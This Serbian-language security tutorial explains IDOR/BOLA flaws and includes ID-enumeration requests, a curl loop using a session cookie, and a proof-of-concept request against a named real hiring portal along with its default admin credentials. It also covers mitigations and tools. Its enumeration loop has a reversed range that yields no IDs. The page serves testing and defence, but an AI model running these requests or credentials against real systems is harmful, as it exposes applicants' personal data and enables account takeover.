# IDOR (Insecure Direct Object Reference)

{{#include ../banners/hacktricks-training.md}}

IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) se pojavljuje kada web ili API krajnja tačka otkriva ili prihvata identifikator koji korisnik može kontrolisati, a koji se koristi **direktno** za pristup unutrašnjem objektu **bez provere da li je pozivalac ovlašćen** da pristupi/izmeni taj objekat. Uspešna eksploatacija obično omogućava horizontalno ili vertikalno eskaliranje privilegija, kao što su čitanje ili modifikovanje podataka drugih korisnika i, u najgorem slučaju, potpuni preuzimanje naloga ili masovno iskopavanje podataka.

---
## 1. Identifikacija potencijalnih IDOR-a

1. Tražite **parametre koji se odnose na objekat**:
* Putanja: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
* Upit: `?id=42`, `?invoice=2024-00001`
* Telo / JSON: `{"user_id": 321, "order_id": 987}`
* Headeri / Kolačići: `X-Client-ID: 4711`
2. Preferirajte krajnje tačke koje **čitaju ili ažuriraju** podatke (`GET`, `PUT`, `PATCH`, `DELETE`).
3. Obratite pažnju kada su identifikatori **sekvencijalni ili predvidivi** – ako je vaš ID `64185742`, onda verovatno postoji `64185741`.
4. Istražite skrivene ili alternativne tokove (npr. *"Članovi Paradox tima"* link na stranicama za prijavu) koji bi mogli otkriti dodatne API-je.
5. Koristite **autentifikovanu sesiju sa niskim privilegijama** i menjajte samo ID **zadržavajući isti token/kolačić**. Odsustvo greške autorizacije obično je znak IDOR-a.

### Brzo ručno manipulisanje (Burp Repeater)
```
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```
### Automatizovana enumeracija (Burp Intruder / curl petlja)
```bash
for id in $(seq 64185742 64185700); do
curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-H "Cookie: auth=$TOKEN" \
-d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```
---
## 2. Studija slučaja iz stvarnog sveta – McHire Chatbot Platforma (2025)

Tokom procene **McHire** portala za zapošljavanje koji koristi Paradox.ai, otkriven je sledeći IDOR:

* Endpoint: `PUT /api/lead/cem-xhr`
* Authorization: kolačić sesije korisnika za **bilo** koji test račun restorana
* Body parameter: `{"lead_id": N}` – 8-cifreni, **sekvencijalni** numerički identifikator

Smanjivanjem `lead_id`, tester je dobio proizvoljne aplikante **pune PII** (ime, e-mail, telefon, adresa, preferencije smene) plus potrošački **JWT** koji je omogućio preuzimanje sesije. Enumeracija opsega `1 – 64,185,742` otkrila je otprilike **64 miliona** zapisa.

Dokaz koncepta zahteva:
```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-d '{"lead_id":64185741}'
```
Combined with **default admin credentials** (`123456:123456`) that granted access to the test account, the vulnerability resulted in a critical, company-wide data breach.

---
## 3. Uticaj IDOR / BOLA
* Horizontalna eskalacija – čitanje/izmena/bršenje **podataka drugih korisnika**.
* Vertikalna eskalacija – korisnik sa niskim privilegijama dobija funkcionalnosti samo za administratore.
* Masovno curenje podataka ako su identifikatori sekvencijalni (npr. ID-evi aplikanta, fakture).
* Preuzimanje naloga krađom tokena ili resetovanjem lozinki drugih korisnika.

---
## 4. Mogućnosti smanjenja rizika i najbolje prakse
1. **Sprovodite autorizaciju na nivou objekta** za svaki zahtev (`user_id == session.user`).
2. Preferirajte **indirektne, nepredvidive identifikatore** (UUIDv4, ULID) umesto auto-increment ID-eva.
3. Sprovodite autorizaciju **na serverskoj strani**, nikada se ne oslanjajte na skrivene forme ili UI kontrole.
4. Implementirajte **RBAC / ABAC** provere u centralnom middleware-u.
5. Dodajte **ograničenje brzine i logovanje** za otkrivanje enumeracije ID-eva.
6. Bezbednosno testirajte svaki novi endpoint (jedinično, integraciono i DAST).

---
## 5. Alati
* **BurpSuite ekstenzije**: Authorize, Auto Repeater, Turbo Intruder.
* **OWASP ZAP**: Auth Matrix, Forced Browse.
* **Github projekti**: `bwapp-idor-scanner`, `Blindy` (masovno lov na IDOR).



## Reference
* [McHire Chatbot Platform: Default Credentials and IDOR Expose 64M Applicants’ PII](https://ian.sh/mcdonalds)
* [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* [How to Find More IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
{{#include ../banners/hacktricks-training.md}}
